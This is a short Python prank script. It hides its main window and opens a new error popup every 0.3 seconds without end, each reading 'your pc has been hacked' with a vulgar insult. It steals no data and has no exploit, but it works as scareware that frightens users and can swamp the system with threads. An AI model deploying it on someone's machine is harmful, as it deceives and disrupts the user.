import threading
import time
import tkinter as tk
from tkinter import messagebox

def show_message():
    while True:
        threading.Thread(
            target=lambda: messagebox.showerror("Hacker", "Haha bitch, your pc has been hacked")
        ).start()
        time.sleep(0.3)

root = tk.Tk()
root.withdraw()

threading.Thread(target=show_message).start()
root.mainloop()